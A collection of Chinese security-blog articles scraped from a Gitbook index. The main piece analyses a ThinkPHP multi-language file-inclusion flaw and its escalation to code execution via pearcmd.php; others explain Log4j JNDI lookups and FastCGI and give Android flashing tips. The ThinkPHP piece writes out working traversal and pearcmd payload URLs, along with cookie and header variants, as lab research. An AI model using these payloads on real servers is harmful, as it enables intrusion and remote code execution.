"},"markdown/漏洞研究/JAVA安全/Log4j/log4j漏洞分析.html":{"url":"markdown/漏洞研究/JAVA安全/Log4j/log4j漏洞分析.html","title":"Log4j漏洞分析","keywords":"","body":"log4j漏洞分析 漏洞POC 漏洞断点 在org\\apache\\logging\\log4j\\log4j-core\\2.14.1\\log4j-core-2.14.1.jar!\\org\\apache\\logging\\log4j\\core\\net\\JndiManager.class处下断点 处理字符串 org.apache.logging.log4j.core.lookup.JndiLookup#lookup用于获取字符串形式的JNDI资源， 进一步会调用org.apache.logging.log4j.core.net.JndiManager#getDefaultManager()获取JndiManager实例， JndiManager实例调用自己的方法org.apache.logging.log4j.core.net.JndiManager#lookup org.apache.logging.log4j.core.net.JndiManager#lookup 实际上是去调用javax.naming.Context#lookup(java.lang.String) 最终指向JDNI服务器获取资源 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2021-12-10 11:34:09 "},"markdown/漏洞研究/PHP安全/TP框架/tp6多语言模块RCE漏洞利用分析.html":{"url":"markdown/漏洞研究/PHP安全/TP框架/tp6多语言模块RCE漏洞利用分析.html","title":"Tp6多语言模块RCE漏洞利用分析","keywords":"","body":"ThinkPHP 6 多语言模块 RCE 漏洞利用分析 前言 在漏洞复现与分析过程中，很容易流于表面的复现，又或是陷入细节的迷宫。那么我们应该如何找到真正的大门？ 在笔者看来，对于一个新的漏洞，我们的研究方式首先是提出并尽可能回答问题： 漏洞的逻辑是怎样的？不同版本有何区别？ 漏洞利用可以拆分为漏洞原型 + trick，那么哪些 trick 是有用的，哪些是没有用的，为什么？ 和该组件历史上的漏洞有哪些关联？ 对挖掘同类型的漏洞有什么启发意义？ 然后在复现、分析、总结的过程中始终围绕这几个核心问题去不断思考、发问、记录。 配置环境 phpStudy 配置 如果各位要调试 PHP，Windows 上使用 phpStudy 是比较方便的选择。 （注意在此界面配置 PHP 的时候，每次点确认都会重写配置文件，不要后续改动后，再次在这个界面设置确认。） 在 php.ini 中，我们同样要修改设置以便于我们远程调试： 并且新增一个自动开始的设置： 最后，修改 apache 的超时设置，也是为了方便调试 KeepAliveTimeout 5000 MaxKeepAliveRequests 100 Timeout 6000 FcgidIOTimeout 6000 VSCODE 配置 vscode 配置设置相应的 PHP 程序位置 配置调试的 launch.json 端口（与 phpStudy 一致） 安装 ThinkPHP 安装 ThinkPHP 可以使用 composer 来安装，版本号可以自行指定。 composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ composer create-project topthink/think=6.0.2 ./ThinkPHP-6 （通过composer直接获取的ThinkPHP 6各版本都是12月16日修复过的，推荐使用docker来复现ThinkPHP 6版本的漏洞） composer create-project topthink/think=5.0.10 ./ThinkPHP-5 漏洞利用分析 ThinkPHP 5 的部分利用研究 这里我们先来看看老版本 ThinkPHP 5 是如何处理相关的逻辑的，常见的路径如下，可以从中找到多语言模块相关的配置。 /ThinkPHP-5-dir/config/app.php /ThinkPHP-5-dir/application/config.php 默认情况下是不会开启的，我们手动配置成 true。 我们先来看看最直接的 POC 是怎样的，直接包含一个 index 会有报错，效果不是很明显（注意 Linux 必须使用 /，只有 Windows 同时兼容 \\ ）： http://127.0.0.1/public/?lang=../../../public/index 换一个更直接一点的情况，在 /public/ 的目录下新建一个 phpinfo 的文件，再次尝试文件包含： 访问 http://127.0.0.1/public/?lang=../../../public/info2 发现确实能够进行文件包含。 再通过代码分析一下逻辑：开启多语言功能后，使用 detect() → 通过 url 参数读取 langSet → 加载语言包 include $_file； url 中的参数 lang=../../../public/info2 通过上面的途径被传入到 ThinkPHP 5 框架变量中。 传入的 ThinkPHP 5 框架变量直接被当作文件路径和文件名，然后拼接 PHP 文件名后缀。 拼接 PHP 文件名后缀之后，判断文件是否实际存在，最后通过include进行文件包含（LFI）。 类似的，我们也可以传入参数 lang=../../public/info2，这时候则是让 $file[1] 被包含。 因此，可以把 ThinkPHP 5 版本下漏洞的原型视为 后缀受限的 LFI 。 但是，为了稳定地利用又产生了新的问题：怎样稳定产生用于包含的本地文件呢？此处正确答案笔者先暂时按下不表，往下提出几种可能性方案，请读者耐心继续往下看。 有关 PHPINFO + LFI 等利用思路的局限 在 P 牛师傅的文章 Docker PHP 裸文件本地包含综述 中提到了多种利用包含临时文件来实现 RCE 的思路，但这里我需要说明一下为什么大部分思路在这里都是无效的。 值得注意的一点是，这个数组拼接了 PHP 的后缀，且使用了 is_file() 进行检查，因此通过日志、session、临时文件等方式利用的通道被堵死了。 Lang::load([ THINK_PATH . 'lang' . DS . $request->langset() . EXT, APP_PATH . 'lang' . DS . $request->langset() . EXT, ]); 例如使用《自如网某业务文件包含导致命令执行（LFI + PHPINFO getshell 实例）》这个案例中所演示的脚本进行利用，其主要思路是：访问 PHP 并 post 上传文件时，会产生临时文件（与实际 PHP 逻辑无关），在临时文件被清除前利用文件包含实现 RCE。而且恰好 phpinfo 可以显示当前的临时文件名，通过条件竞争很容易达成在临时文件被清除前利用文件包含。 临时文件生成原理如下图（出自Gynvael Coldwind的文章）： 但在 ThinkPHP 多语言模块漏洞下，除了在 Windows 下存在读取文件名不完整和跨盘符的问题外（Linux 下没有这个问题），本质问题还是该 LFI 漏洞所使用 lang 参数无法读取非 PHP 后缀的文件。 类似的，目标环境开启了 session.upload_progress.enable 选项，也因为后缀问题无法包含可控的 session 文件导致利用失败。 不过很有意思的一点是：如果目标是 PHP 5.X 且是 Windows 系统，可以利用 Windows 的通配符特性读取文件。（这里我们手动在 Web 目录下放一个 phpinfo.php 文件进行测试） ppqq PHP 在读取 Windows 文件时，会使用到 FindFirstFileExW 这个 Win32 API 来查找文件，而这个 API 支持使用通配符。 ppqq - DOS_STAR：即 ，匹配 0 个以上的字符 ppqq - DOS_QM：即>，匹配 1 个字符 ppqq - DOS_DOT：即\"，匹配点号 有关 ThinkPHP 5.X 命令执行与多语言 LFI 的组合利用 琢磨了半天感觉有点鸡肋，等研究出什么特别有意思的东西后再补。权且先贴一张七月火师傅的 ThinkPHP 5-RCE 漏洞流程图以供思路启发： 基于控制器利用 基于路由的利用 ThinkPHP 6 的部分利用研究 复现漏洞最推荐使用 docker 进行复现操作。 docker pull vulfocus/thinkphp:6.0.12 本地安装 ThinkPHP 6 也可以使用 composer 来安装，版本号可以自行指定： composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ composer create-project topthink/think=6.0.2 ./ThinkPHP_6 （通过composer直接获取的ThinkPHP 6各版本都是12月16日修复过的） #解决办法 docker pull vulfocus/thinkphp:6.0.12（推荐，可以从镜像中提取老版的\\vendor\\topthink\\framework替换\\ThinkPHP_6\\vendor\\topthink\\framework路径下的文件来进行调试复现） https://github.com/top-think/framework (不推荐，可以在此处下载对应老版本版本的源码替换\\ThinkPHP_6\\vendor\\topthink\\framework路径下的文件来进行调试复现) ThinkPHP 6 处理相关的逻辑的常见的路径如下，可以从中找到多语言模块相关的配置。 /ThinkPHP-6-dir/app/middleware.php 默认情况下是不会开启的，我们也是手动配置一下，去掉注释。 此处就不再重复 ThinkPHP 5 中 phpinfo 的方式，使用 http://127.0.0.1/public/?lang=../../../../../public/index 产生报错证明漏洞。（注意 Linux 必须使用 /，只有 Windows 同时兼容 \\ ） 等价 Cookie: think_lang=..%2F..%2F..%2F..%2f..%2Fpublic%2Findex 等价 think-lang: ../../../../../public/index 这几种 payload 等价的原因体现在代码层面，就是设置了三个判断逻辑来接收变量。 后续的逻辑也是和 ThinkPHP 5 基本一样，获取的变量直接拼接 PHP 后缀进行文件包含。 pearcmd.php 的利用思路是如何突破局限的 这里引用一下 P 牛的介绍，我们只需要知道，它是 PHP 文件且 docker 中都会安装即可。（顺带一提 ThinkPHP 6 必须要使用 PHP 7.2 以上才能正常运行） ppqq pecl 是 PHP 中用于管理扩展而使用的命令行工具，而 pear 是 pecl 依赖的类库。在 7.3 及以前，pecl/pear 是默认安装的；在 7.4 及以后，需要我们在编译 PHP 的时候指定 --with-pear 才会安装。 ppqq 不过，在 Docker 任意版本镜像中，pcel/pear 都会被默认安装，安装的路径在 /usr/local/lib/php。 通过命令行的形式查看 pearcmd 的参数： 我们可以找到一个 config-create 的 command；其中 root path 指定了创建的配置文件中的 root path 变量，该字符串就被包含在文件里了；filename 参数可以控制生成的指定目录和文件名；通过这两个参数可以建立含有指定内容的文件在任意目录。 比如 bash# PHP /usr/local/lib/php/pearcmd.php config-create / /tmp/hello.php 就可以创建 /tmp/hello.php 文件，里面的内容就包含了 /。这里的/符号不可或缺，因为必须符合 root path 的路径格式要求。 但从这里来看，pearcmd 很显然是一个命令行文件，似乎和文件包含漏洞关系不大。 这里我们先来简单了解一下另一个概念：CGI（以下两段引用自《全面了解 CGI、FastCGI、PHP-FPM》） ppqq CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与 PHP 应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI 可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如 php、perl、tcl 等。 ppqq WEB 服务器会传哪些数据给 PHP 解析器呢？URL、查询字符串、POST 数据、HTTP header 都会有。所以，CGI 就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。也就是说，CGI 就是专门用来和 web 服务器打交道的。web 服务器收到用户请求，就会把请求提交给 cgi 程序（如 php-cgi），cgi 程序根据请求提交的参数作应处理（解析 php），然后输出标准的 html 语句，返回给 web 服服务器，WEB 服务器再返回给客户端，这就是普通 cgi 的工作原理。（cgi 程序，你就可以理解成遵循 cgi 协议编写的程序） 了解完 CGI 的概念，代入到常见的 Apahce+php 的架构中，我们来熟悉一次请求 index.php 的过程。 ppqq ppqq 当请求的是 index.php，根据配置文件，Web Server 知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给 PHP 解析器。 ppqq Web Server 收到 index.php 这个请求后，会启动对应的 CGI 程序，这里就是 PHP 的解析器。接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程，Web server 再把结果返回给浏览器。这就是一个完整的动态 PHP Web 访问流程，接下来再引出这些概念，会好理解很多。 ppqq CGI：是 Web Server 与 Web Application 之间数据交换的一种协议。 ppqq FastCGI：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。 ppqq PHP-CGI：是 PHP（Web Application）对 Web Server 提供的 CGI 协议的接口程序。 ppqq PHP-FPM：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。 ppqq（Web Server 一般指 Apache、Nginx、IIS、Tomcat 等服务器，Web Application 一般指 PHP、Java、Asp.net 等应用程序） 关于这个 trick 这里我们提两点前提条件： ppqq Docker 环境下的 PHP 会开启 register_argc_argv 这个配置。当开启了这个选项，用户的输入将会被赋予给 $argc、$argv、$_SERVER['argv'] 几个变量。 ppqq PHP 以 Server 的形式运行，且又开启了 register_argc_argv ，在请求是 GET 或 HEAD 时，则 query-string 被可以作为命令行参数输入。 这里再次关联一下这篇文章：《 PHP-CGI 远程代码执行漏洞（CVE-2012-1823）分析 》。从中我们可以窥见 cgi 漏洞的历史渊源。 ppqq 当 query-string 中不包含没有解码的=号的情况下，要将 query-string 作为 cgi 的参数传入。所以，Apache 服务器按要求实现了这个功能。 此处 P 牛提到的 RFC3875 中规定了服务器处理 query-string 的方式，Apache 正是按照这个标准实现的 CGI 协议，借助 CGI 协议与 PHP 进行通信；PHP 的源码中不限制 php-cgi 接受命令行参数；也就是说，根据这个 RFC3875 规定，Apache 发现 GET 或者 HEAD 请求传输的 querystring 中不包含没有解码的=号的情况下，会将 querystring 作为 cgi 的参数传入，且开启了 register_argc_argv 的 PHP将其会视为命令行参数进行接受。 4.4. The Script Command Line Some systems support a method for supplying an array of strings to the CGI script. This is only used in the case of an 'indexed' HTTP query, which is identified by a 'GET' or 'HEAD' request with a URI query string that does not contain any unencoded \"=\" characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules search-string = search-word *( \"+\" search-word ) search-word = 1*schar schar = unreserved | escaped | xreserved xreserved = \";\" | \"/\" | \"?\" | \":\" | \"@\" | \"&\" | \"=\" | \",\" | \"$\" After parsing, each search-word is URL-decoded, optionally encoded in a system-defined manner and then added to the command line argument list. 细看 RFC3875 描述：search-string 指的是 cgi 中命令行输入，命令行输入中多个参数使用+来分割 eg：http://abc.com/input.cgi?pramA+pramB+pramC 等价于命令行形式 bash# ./input.cgi pramA pramB pramC 实际上并不仅限于 cgi 文件，从 RFC3875 描述中可知，Apache 其实并不会考虑后缀，只要符合 GET 和不包含没有解码的=号参数的情况就会作为命令行参数进行参数传入。 那么加上 lang 参数后（这里显式的写了 index.php，上文是隐式访问了 index.php，但具体访问哪个 PHP 文件并无关系我们只需要 ThinkPHP 框架的全局参数 lang 来包含 pearcmd 即可）： http://127.0.0.1/public/index.php?+config-create+/&lang=../../../../../../../../usr/local/lib/php/pearcmd&/+/tmp/hello.php 这里的querystring=+config-create+/&lang=../../../../../../../../usr/local/lib/php/pearcmd&/+/tmp/hello.php 这一长串输入都是 querystring， +config-create+ 和 +/tmp/hello.php 的 + 符号可以视为空格的替代。 由于 Apache 把整个querystring=+config-create+/&lang=../../../../../../../../usr/local/lib/php/pearcmd&/+/tmp/hello.php都作为 cgi 的命令行参数传入 php。 且含有参数 lang，所以 PHP 处理中也会触发 LFI 漏洞，相当于?lang=../../../../../../../../usr/local/lib/php/pearcmd 被触发了。 随后根据上下文，querystring 作为 cgi 的命令行参数传入到被包含的 pearcmd 中。（对更详细的处理过程感兴趣的可以参看我写的另一篇《浅谈 Apache/Nginx 与 PHP-CGI 之间的关系》） 理想情况下等价于 bash# PHP /usr/local/lib/php/pearcmd.php config-create / /tmp/hello.php 中间的空格刚刚好是对应三个 + ，执行效果也就是在指定路径的创建指定文件内容。 但还记得我们刚刚说的吗？ ppqq 这里的querystring=+config-create+/&lang=../../../../../../../../usr/local/lib/php/pearcmd&/+/tmp/hello.php 这一长串输入都是 querystring，+config-create+和+/tmp/hello.php的+符号可以视为空格的替代。 所以最终等价于 bash# PHP /usr/local/lib/php/pearcmd.php config-create /&lang=../../../../../../../../usr/local/lib/php/pearcmd&/ /tmp/hello.php 通过以上几点就不难理解为什么 payload 中的参数与下图我们平时理解的 URL 有一些不同。 这里我们顺理成章的使用 poc 请求： http://127.0.0.1/public/index.php?+config-create+/&lang=../../../../../../../../usr/local/lib/php/pearcmd&/+/tmp/hello.php 此时我们看一下创建的文件内容应该能更好的理解整个漏洞利用的处理方式。 # cat /tmp/hello.php #PEAR_Config 0.9 a:13:{s:7:\"php_dir\";s:81:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/php\";s:8:\"data_dir\";s:82:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/data\";s:7:\"www_dir\";s:81:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/www\";s:7:\"cfg_dir\";s:81:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/cfg\";s:7:\"ext_dir\";s:81:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/ext\";s:7:\"doc_dir\";s:82:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/docs\";s:8:\"test_dir\";s:83:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/tests\";s:9:\"cache_dir\";s:83:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/cache\";s:12:\"download_dir\";s:86:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/download\";s:8:\"temp_dir\";s:82:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/temp\";s:7:\"bin_dir\";s:77:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear\";s:7:\"man_dir\";s:81:\"/&lang=../../../../../../../../usr/local/lib/php/pearcmd&//pear/man\";s:10:\"__channels\";a:2:{s:12:\"pecl.php.net\";a:0:{}s:5:\"__uri\";a:0:{}}}# 那么更好的 poc 改进方式，就是把 lang 参数提前，在保证触发 lang 参数的情况下，减少多余符号。同时切记保留 config-create / 中，参数 root path 要求的不可或缺的一个 / 即可： http://127.0.0.1/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/+/tmp/hello.php 暂时的总结 写完这篇分析文章，回过头再看一下开头写的几个问题： 漏洞的逻辑是怎样的？不同版本有何区别？ 漏洞利用可以拆分为漏洞原型 + trick，那么哪些 trick 是有用的，哪些是没有用的，为什么？ 和该组件历史上的漏洞有哪些关联？ 对挖掘同类型的漏洞有什么启发意义？ 我们不难知晓： ThinkPHP 6 版本下漏洞的原型为 后缀受限的 LFI + pearcmd.php 的 LFI 利用 Trick ThinkPHP 5 版本下漏洞的原型为 后缀受限的 LFI + Windows 的 LFI 通配符利用 Trick (当然，条件允许的情况下一样可以使用 pearcmd 的 trick) 由于后缀受限，致使我们必须通过包含.php后缀的文件才能实现漏洞利用，从而排除了利用临时文件、session、日志等的 trick。 最后，对比 ThinkPHP 5 RCE，本漏洞为 LFI 类型漏洞； ThinkPHP 5.x 命令执行分为两种：其一，是框架 Request 类的 method 方法可控，借助该方法可去调用其他方法（此处是调用一个析构方法，去进一步覆盖有命令执行 sink 的类的变量）。其二，是通过路由去调用指定控制器，进一步调用控制器内的方法实现的 RCE 或者 LFI。 本身 RCE 是自成体系的，不太需要这限制多语言配置下的后缀受限 LFI 漏洞。（个人对 ThinkPHP 5 RCE 的利用链理解还是比较有限，此外公开一些鸡肋的利用方式也不过是给菠菜站点升级的机会罢了） 如果要挖掘同类漏洞，主要还是寻找 ThinkPHP 框架提供的全局变量的输入点 source，有更靠谱的输入点比较重要。ThinkPHP 的修补方式大多以输入点过滤为主，对后续的利用链影响不大。 5. 参考资料 Docker PHP 裸文件本地包含综述 RFC3875 PHP-CGI 远程代码执行漏洞（CVE-2012-1823）分析 PHP_LFI_rfc1867_temporary_files - Gynvael Coldwind 全面了解 CGI、FastCGI、PHP-FPM Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 17:51:40 "},"markdown/漏洞研究/PHP安全/TP框架/浅谈ApacheNginx与PHP-CGI之间的关系.html":{"url":"markdown/漏洞研究/PHP安全/TP框架/浅谈ApacheNginx与PHP-CGI之间的关系.html","title":"浅谈ApacheNginx与PHP CGI之间的关系","keywords":"","body":"浅谈Apache/Nginx 与 PHP-CGI 之间的关系 前言 本文主要援引以下两篇文章，用以进一步解释 LFI + pearcmd 在漏洞利用过程中的执行细节，用于对旧文《tp6多语言模块RCE漏洞利用分析》的补充。 Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写 浅谈PHP-FPM安全 这两篇文章中谈到了Apache/Nginx与PHP-CGI之间具体传递的协议和数据内容。 执行细节分析 我们以phpstudy的环境为例，详细讲一下LFI+pearcmd执行时的具体细节： 通常情况下环境为 apche + php x.x.x nts ，这里的nts指的是使用fastcgi模式。 Mi1k7ea师傅已经在博客中详细引用和解释了fastcgi传递的东西，这里不再解释。 下面我们看下FastCGI协议的record结构是怎样的，这里的直接引用自P牛博客的内容： 和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下： > typedef struct { > /* Header */ > unsigned char version; // 版本 > unsigned char type; // 本次record的类型 > unsigned char requestIdB1; // 本次record对应的请求id > unsigned char requestIdB0; > unsigned char contentLengthB1; // body体的大小 > unsigned char contentLengthB0; > unsigned char paddingLength; // 额外块大小 > unsigned char reserved; > > /* Body */ > unsigned char contentData[contentLength]; > unsigned char paddingData[paddingLength]; > } FCGI_Record; > 头由8个uchar类型的变量组成，每个变量1字节。其中，requestId占两个字节，一个唯一的标志id，以避免多个请求之间的影响；contentLength占两个字节，表示body的大小。 语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。 Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。 可见，一个fastcgi record结构最大支持的body大小是2^16，也就是65536字节。 type type就是指定该record的作用。因为FastCGI一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过type来标志每个record的作用，用requestId作为同一次请求的id。 也就是说，每次请求，会有多个record，他们的requestId是相同的。 主要的几种type类型如下图： 服务器中间件和PHP-FPM通信的第一个数据包是type为1的record，而后续通信的type为4、5、6、7的record，结束时发送type为2、3的record。 这里我们重点关注type为4的record，因为后面的漏洞利用涉及到这块。 当后端语言接收到一个type为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下： > typedef struct { > unsigned char nameLengthB0; /* nameLengthB0 >> 7 == 0 */ > unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */ > unsigned char nameData[nameLength]; > unsigned char valueData[valueLength]; > } FCGI_NameValuePair11; > > typedef struct { > unsigned char nameLengthB0; /* nameLengthB0 >> 7 == 0 */ > unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */ > unsigned char valueLengthB2; > unsigned char valueLengthB1; > unsigned char valueLengthB0; > unsigned char nameData[nameLength]; > unsigned char valueData[valueLength > ((B3 & 0x7f) } FCGI_NameValuePair14; > > typedef struct { > unsigned char nameLengthB3; /* nameLengthB3 >> 7 == 1 */ > unsigned char nameLengthB2; > unsigned char nameLengthB1; > unsigned char nameLengthB0; > unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */ > unsigned char nameData[nameLength > ((B3 & 0x7f) unsigned char valueData[valueLength]; > } FCGI_NameValuePair41; > > typedef struct { > unsigned char nameLengthB3; /* nameLengthB3 >> 7 == 1 */ > unsigned char nameLengthB2; > unsigned char nameLengthB1; > unsigned char nameLengthB0; > unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */ > unsigned char valueLengthB2; > unsigned char valueLengthB1; > unsigned char valueLengthB0; > unsigned char nameData[nameLength > ((B3 & 0x7f) unsigned char valueData[valueLength > ((B3 & 0x7f) } FCGI_NameValuePair44; > 这其实是4个结构，至于用哪个结构，有如下规则： key、value均小于128字节，用FCGI_NameValuePair11 key大于128字节，value小于128字节，用FCGI_NameValuePair41 key小于128字节，value大于128字节，用FCGI_NameValuePair14 key、value均大于128字节，用FCGI_NameValuePair44 举个例子，用户访问http://127.0.0.1/index.php?a=1&b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对，即此时FastCGI协议包record的type为4： { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&b=2', 'REQUEST_URI': '/index.php?a=1&b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1' } 这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。 PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。 有个注意点，就是PHP 5.3.9之后加入了FPM增加了security.limit_extensions选项，这个选项默认只解析.php文件。 我们在LFI+pearcmd的案例http://127.0.0.1/public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/+/tmp/hello.php中： Apache向PHP-CGI传递的内容应该如下（Nginx和Apache传递的内容是一样的，因为必须要符合FastCGI/1.0的接口通讯规定） { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': 'D:/phpstudy_pro/WWW/thinkphp_5.0.10_full/public/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/+/tmp/hello.php', 'REQUEST_URI': '/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/+/tmp/hello.php', 'DOCUMENT_ROOT': 'D:/phpstudy_pro/WWW/thinkphp_5.0.10_full', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1' } 这些键值对会被传递到Fast-CGI中，Fast-CGI的子进程PHP-CGI把这些键值对数组以$_SERVER的环境变量形式以及对应的PHP文件，再传递给启动的PHP解释器。 这里PHP解释器会先解释index.php，要解释index.php还得加载thinkphp框架，thinkphp框架会从$_SERVER中的QUERY_STRING获取多语言变量lang从而触发LFI漏洞，更进一步的调用pearcmd.php。 作一个不太严谨的简单解释，可以类比函数调用：index.php → thinkphp → pearcmd.php 在这个过程中，也就是PHP解释器的进程上下文中，PHP脚本始终可以从$_SERVER中的获取需要的环境变量。也就是说 pearcmd.php依然通过$_SERVER中的QUERY_STRING获取被视为命令行参数的输入。具体代码如下： pear中获取命令行argv的函数： public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = \"Could not read cmd args (register_argc_argv=Off?)\"; return PEAR::raiseError(\"Console_Getopt: \" . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } 先尝试$argv，如果不存在再尝试$_SERVER['argv']，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。 当 pearcmd.php的config-create被执行完成后，逐级返回： pearcmd.php → thinkphp → index.php 到这一步对index.php的请求才处理完成，PHP-CGI进程把结果通过Fast-CGI协议响应给Apache，Apache以http形式响应用户浏览器。至此一次请求才算结束（不算超时的情况）。 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 17:51:42 "},"markdown/移动安全/Android_10_分区的一些知识.html":{"url":"markdown/移动安全/Android_10_分区的一些知识.html","title":"Android 10 分区的一些知识","keywords":"","body":"Android 10分区的一些知识 安卓的各个分区详解 安卓各个分区 boot：包含通过 mkbootimg 组合在一起的kernel镜像和 ramdisk。使能system-as-root后，该分区仅存放kernel镜像。 system：主要包含 Android 框架。使能system-as-root后，该分区会包含原始 system.img 和 ramdisk.img 的合并内容。 recovery：用于存储在 OTA 升级时使用的recovery系统。如果设备支持A/B更新，OTA升级可以通过ramdisk执行，该分区可以不需要。 cache：用于存储临时数据，OTA升级包也会下载到这个分区。如果设备使用 A/B 更新，则可以不要此分区。 misc：分区供recovery使用，存储空间不能小于 4KB。 userdata：存储用户安装的应用和数据。 metadata：如果设备被加密，则需要使用该分区，分区的存储空间不能小于 16MB。 vendor：包含所有不可分发给 Android 开源项目 (AOSP) 的二进制文件。如果没有专有信息，可以不要该分区。 radio：包含无线装置映像。只有包含无线装置的设备才需要此分区。 tos：用于存储 Trusty 操作系统的二进制映像文件，仅在设备包含 Trusty 时使用。 product：用于存放产品专用的配置和应用，以便OEM定制自己的系统。Android 9 及更高版本支持该分区。product分区是对system分区的扩展，必须同时升级这两个分区。 odm：用于ODM自定义自己的板级支持包。Android 10 开始支持该分区。odm分区是对vendor分区的扩展，必须同时升级这两个分区。 在新设备上实现的动态分区 分区更改 对于搭载 Android 10 的设备，请创建名为 super 的分区。super 分区在内部处理 A/B 槽位，因此 A/B 设备不需要单独的 super_a 和 super_b 分区。引导加载程序未使用的所有只读 AOSP 分区都必须是动态的，并且必须从 GUID 分区表 (GPT) 中移除。供应商专用分区则可以不是动态的，并且可以放在 GPT 中。 支持的动态分区包括：system、vendor、product、system、odm。下图显示转换为动态分区前后变化， Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 18:35:32 "},"markdown/移动安全/Android_10_简明刷机与救砖教程.html":{"url":"markdown/移动安全/Android_10_简明刷机与救砖教程.html","title":"Android 10 简明刷机与救砖教程","keywords":"","body":"Android 10 简明刷机与救砖教程 刷机和救砖教程 （可以参考https://blog.csdn.net/Ender_Zhao/article/details/109903166） 1.确保自己是最新版本的usb驱动和sdk(包含adb和fastboot) https://developer.android.google.cn/studio/run/win-usb https://developer.android.google.cn/studio/releases/platform-tools 2.确定自己刷机的方式 （务必确定自己手机已解锁BL） 安卓通用刷机方式： 2.1. 卡刷（TWRP）：通过进入TWRP（bootloader）界面中进行刷机，需要刷机包.zip 或者 刷机包.bin。（多出现在pixel1以及更早的机器上） 2.2. 线刷：通过usb连接，进入bootloader或者fastboot下，运行脚本或输入指令进行刷机。（在比较新的机器上，通常都是使用线刷） 3.这里以线刷为例，https://developers.google.cn/android/images 访问后根据自己型号和需要的版本来选择，点击Link下载 刷机包.zip 这里插一嘴，AOSP类型的系统，有独特的命名方式比如aosp10R2版本实际上指的是QP1A.190711.020，可以在这里查到 https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn 解压后通常都有以下文件 bootloader: 包含启动引导等 radio: 包含基带、驱动等 image.zip: 刷机所需的system、boot等镜像组成的压缩包。 flash-all.bat: 刷机脚本 配置本机path变量 ANDROID_PRODUCT_OUT 进入fastboot模式后，先用flash-all.bat刷写基带固件。 ./flash-all.bat 如果出现报错，请看下面。 潜在的坑点 如果遇到Partition should be flashed in fastbootd的报错。是因为动态分区的设备上，aosp要求rec提供用户空间fastboot（fastbootd） (可以理解为一个可以挂载super分区并修改其中动态分区内容的fastboot加强版) 重新配置本机path变量 ANDROID_PRODUCT_OUT 到一个新的路径 